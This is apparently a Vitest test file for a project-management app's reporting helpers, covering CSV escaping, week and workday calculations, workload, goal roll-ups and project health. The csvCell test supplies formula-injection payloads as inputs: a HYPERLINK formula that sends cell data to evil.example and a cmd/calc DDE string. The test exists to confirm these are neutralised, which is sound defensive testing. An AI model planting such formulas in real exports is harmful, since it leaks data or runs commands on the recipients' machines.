import { describe, it, expect } from "vitest";
import type { Task, Goal } from "../../data/types";
import {
  csvCell, csvText, localDay, startOfWeekMon, addDays, weeklyThroughput, taskLoadInWeek, workloadForWeek,
  fmtHours, goalTree, goalDescendants, goalProgressMap, resolveTagId, projectHealth, workdays,
} from "./reportingUtils";

const iso = (d: Date) => `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, "0")}-${String(d.getDate()).padStart(2, "0")}`;
let n = 0;
const task = (o: Partial<Task>): Task => ({
  id: "t" + (++n), title: "Task " + n, description: "", status: "todo", priority: "medium", projectId: "p1", assigneeId: "u1",
  tags: [], dependencies: [], subtasks: [], focusMin: 0, comments: 0, aiScore: 0, ...o,
});

describe("csvCell", () => {
  it("neutralises spreadsheet formulas", () => {
    expect(csvCell('=HYPERLINK("https://evil.example/?d="&A1,"Invoice")')).toBe('"\'=HYPERLINK(""https://evil.example/?d=""&A1,""Invoice"")"');
    expect(csvCell("+cmd|' /C calc'!A0")).toBe(`"'+cmd|' /C calc'!A0"`);
    expect(csvCell("@SUM(1,2)")).toBe(`"'@SUM(1,2)"`);
    expect(csvCell("-1+1")).toBe(`"'-1+1"`);
    expect(csvCell("\tx")).toBe(`"'\tx"`);
    expect(csvCell("\rx")).toBe(`"'\rx"`);
  });
  it("leaves plain numbers and ordinary text alone", () => {
    expect(csvCell("-3")).toBe(`"-3"`);
    expect(csvCell("4.5")).toBe(`"4.5"`);
    expect(csvCell(12)).toBe(`"12"`);
    expect(csvCell("Migrate billing")).toBe(`"Migrate billing"`);
    expect(csvCell(null)).toBe(`""`);
  });
  it("builds CRLF rows", () => {
    expect(csvText([["a", 1], ["=b", 2]])).toBe(`"a","1"\r\n"'=b","2"`);
  });
});

describe("dates", () => {
  it("weeks start on Monday", () => {
    expect(iso(startOfWeekMon(new Date(2026, 8, 30)))).toBe("2026-09-28"); // Wed → Mon
    expect(iso(startOfWeekMon(new Date(2026, 8, 28)))).toBe("2026-09-28"); // Mon → same day
    expect(iso(startOfWeekMon(new Date(2026, 9, 4)))).toBe("2026-09-28");  // Sun → previous Mon
  });
  it("reads date-only strings as local days and timestamps as the viewer's day", () => {
    expect(iso(localDay("2026-09-30")!)).toBe("2026-09-30");
    const ts = new Date(2026, 8, 28, 0, 30).toISOString(); // 00:30 local on a Monday
    expect(iso(localDay(ts)!)).toBe("2026-09-28");
    expect(localDay("nonsense")).toBeNull();
    expect(localDay(undefined)).toBeNull();
  });
  it("counts working days arithmetically", () => {
    expect(workdays(new Date(2026, 8, 28), new Date(2026, 9, 4))).toBe(5);   // Mon → Sun
    expect(workdays(new Date(2026, 9, 3), new Date(2026, 9, 4))).toBe(0);    // Sat → Sun
    expect(workdays(new Date(2026, 8, 28), new Date(2026, 9, 9))).toBe(10);  // two weeks
  });
});

describe("weeklyThroughput", () => {
  const monday = new Date(2026, 8, 28, 9, 0); // Monday morning
  it("leaves the partial current week out of velocity and trend", () => {
    const tasks: Task[] = [];
    // 4 full weeks at a steady 10 completions a week, then 1 so far this Monday
    for (let w = 1; w <= 4; w++) for (let i = 0; i < 10; i++) {
      const day = addDays(startOfWeekMon(monday), -7 * w + 2);
      tasks.push(task({ status: "done", createdAt: iso(addDays(day, -1)), completedAt: iso(day) }));
    }
    tasks.push(task({ status: "done", createdAt: iso(monday), completedAt: iso(monday) }));
    const r = weeklyThroughput(tasks, 4, monday);
    expect(r.weekStarts).toHaveLength(5);
    expect(iso(r.weekStarts[4])).toBe("2026-09-28");
    expect(r.completed).toEqual([10, 10, 10, 10, 1]);
    expect(r.velocity).toBe(10);
    expect(r.trend).toBe(0);
    expect(r.totalDone).toBe(41);
  });
  it("seeds the burnup with work from before the window, so completed never exceeds scope", () => {
    const old = iso(addDays(monday, -120));
    const tasks: Task[] = [];
    for (let i = 0; i < 80; i++) tasks.push(task({ createdAt: old, status: i < 40 ? "done" : "todo", completedAt: i < 40 ? iso(addDays(monday, -10)) : undefined }));
    for (let i = 0; i < 10; i++) tasks.push(task({ createdAt: iso(addDays(monday, -20)) }));
    const r = weeklyThroughput(tasks, 8, monday);
    expect(r.cumCreated[r.cumCreated.length - 1]).toBe(90);
    expect(r.cumCompleted[r.cumCompleted.length - 1]).toBe(40);
    r.cumCreated.forEach((c, i) => expect(r.cumCompleted[i]).toBeLessThanOrEqual(c));
    expect(r.cumCreated[0]).toBeGreaterThanOrEqual(80);
  });
  it("never counts a completion before the task existed", () => {
    const t = task({ status: "done", createdAt: iso(addDays(monday, -3)), completedAt: iso(addDays(monday, -40)) });
    const r = weeklyThroughput([t], 4, monday);
    r.cumCreated.forEach((c, i) => expect(r.cumCompleted[i]).toBeLessThanOrEqual(c));
    expect(r.totalDone).toBe(1);
  });
});

describe("workload", () => {
  const wed = new Date(2026, 8, 30);
  const wk = startOfWeekMon(wed);
  it("counts a task due this week in full and ignores one due next month", () => {
    expect(taskLoadInWeek(task({ dueDate: "2026-10-02", effortHours: 6 }), wk, wed)).toEqual({ hours: 6, overdue: false });
    expect(taskLoadInWeek(task({ dueDate: "2026-11-20", effortHours: 60 }), wk, wed)).toBeNull();
  });
  it("spreads a start → due estimate across working days", () => {
    // Mon 28 Sep → Fri 9 Oct = 10 working days; 5 fall in this week
    const l = taskLoadInWeek(task({ startDate: "2026-09-28", dueDate: "2026-10-09", effortHours: 20 }), wk, wed);
    expect(l?.hours).toBeCloseTo(10);
    const next = taskLoadInWeek(task({ startDate: "2026-09-28", dueDate: "2026-10-09", effortHours: 20 }), addDays(wk, 7), wed);
    expect(next?.hours).toBeCloseTo(10);
  });
  it("counts only a weekly share of work under way with no due date, not the whole estimate every week", () => {
    const started = task({ startDate: "2026-07-02", effortHours: 120 });
    const l = taskLoadInWeek(started, wk, wed)!;
    expect(l.overdue).toBe(false);
    expect(l.hours).toBeCloseTo(120 * 5 / workdays(new Date(2026, 6, 2), addDays(wk, 6)));
    expect(l.hours).toBeLessThan(10);
    expect(taskLoadInWeek(started, addDays(wk, 7), wed)).toBeNull();
    // starting this week, it lands in full in its start week (as before)
    expect(taskLoadInWeek(task({ startDate: "2026-10-01", effortHours: 12 }), wk, wed)).toEqual({ hours: 12, overdue: false });
  });
  it("carries overdue open work into the current week only", () => {
    const late = task({ dueDate: "2026-09-10", effortHours: 4 });
    expect(taskLoadInWeek(late, wk, wed)).toEqual({ hours: 4, overdue: true });
    expect(taskLoadInWeek(late, addDays(wk, 7), wed)).toBeNull();
  });
  it("skips done and undated work, and groups by assignee", () => {
    const { rows, undated } = workloadForWeek([
      task({ assigneeId: "a", dueDate: "2026-10-01", effortHours: 20.1 }),
      task({ assigneeId: "a", dueDate: "2026-10-02", effortHours: 20.2 }),
      task({ assigneeId: "a", status: "done", dueDate: "2026-10-02", effortHours: 99 }),
      task({ assigneeId: "b" }),
      task({ assigneeId: "b", dueDate: "2026-12-01", effortHours: 30 }),
    ], wk, wed);
    expect(fmtHours(rows.get("a")!.hours)).toBe("40.3h");
    expect(rows.get("a")!.items).toHaveLength(2);
    expect(rows.get("b")?.items ?? []).toHaveLength(0);
    expect(rows.get("b")?.undated).toBe(1);
    expect(undated).toBe(1);
  });
});

describe("goals", () => {
  const g = (id: string, parentId?: string, extra: Partial<Goal> = {}): Goal => ({ id, name: id, status: "on_track", parentId, ...extra });
  it("renders grandchildren (a nested goal's own sub-goals no longer vanish)", () => {
    const tree = goalTree([g("A", "C"), g("B", "A"), g("C")]);
    expect(tree.map((x) => `${x.g.id}:${x.depth}`)).toEqual(["C:0", "A:1", "B:2"]);
  });
  it("surfaces goals caught in a parent cycle and orphans at the top level", () => {
    const tree = goalTree([g("A", "B"), g("B", "A"), g("X", "missing")]);
    expect(tree.map((x) => x.g.id).sort()).toEqual(["A", "B", "X"]);
    expect(tree.find((x) => x.g.id === "X")?.depth).toBe(0);
  });
  it("finds every descendant, so a goal can't be nested under its own sub-tree", () => {
    const goals = [g("A"), g("B", "A"), g("C", "B"), g("D")];
    expect([...goalDescendants(goals, "A")].sort()).toEqual(["B", "C"]);
    expect(goalDescendants(goals, "D").size).toBe(0);
  });
  it("rolls a parent's progress up from its sub-goals", () => {
    const goals = [g("P"), g("a", "P", { current: 80, target: 100 }), g("b", "P", { current: 50, target: 100 }), g("c", "P", { current: 20, target: 100 }), g("L", undefined, { projectId: "p9" })];
    const m = goalProgressMap(goals, () => 75);
    expect(m.get("P")).toEqual({ pct: 50, source: "subgoals", children: 3, subPct: 50 });
    expect(m.get("a")?.pct).toBe(80);
    expect(m.get("L")).toMatchObject({ pct: 75, source: "project" });
  });
  it("keeps a parent's own number when it already tracks one (no figure change on deploy)", () => {
    const goals = [g("P", undefined, { current: 40, target: 100 }), g("a", "P", { current: 10, target: 100 })];
    expect(goalProgressMap(goals, () => 0).get("P")).toEqual({ pct: 40, source: "manual", children: 1, subPct: 10 });
    // the untouched 0 / 100 parent still rolls up
    const fresh = [g("Q", undefined, { current: 0, target: 100 }), g("b", "Q", { current: 60, target: 100 })];
    expect(goalProgressMap(fresh, () => 0).get("Q")).toMatchObject({ pct: 60, source: "subgoals" });
  });
});

describe("automations: tag values", () => {
  const tags = { "uuid-1": { label: "Urgent", color: "red" }, "uuid-2": { label: "Design", color: "blue" } };
  it("keeps ids and maps legacy free-text labels to the matching tag", () => {
    expect(resolveTagId("uuid-2", tags)).toBe("uuid-2");
    expect(resolveTagId(" urgent ", tags)).toBe("uuid-1");
    expect(resolveTagId("Nope", tags)).toBeNull();
    expect(resolveTagId("", tags)).toBeNull();
  });
});

describe("projectHealth", () => {
  const today = new Date(2026, 8, 30);
  it("mirrors the project overview's RAG rules", () => {
    expect(projectHealth([], today)).toBeNull();
    expect(projectHealth([task({ status: "done" })], today)?.kind).toBe("complete");
    expect(projectHealth([task({ dueDate: "2026-10-05" })], today)?.kind).toBe("on_track");
    expect(projectHealth([task({ dueDate: "2026-09-29" }), task({}), task({}), task({}), task({})], today)?.kind).toBe("at_risk");
    const off = projectHealth([task({ dueDate: "2026-09-01" }), task({ dueDate: "2026-09-02" }), task({ dueDate: "2026-09-03" }), task({})], today);
    expect(off).toMatchObject({ kind: "off_track", overdue: 3 });
  });
});
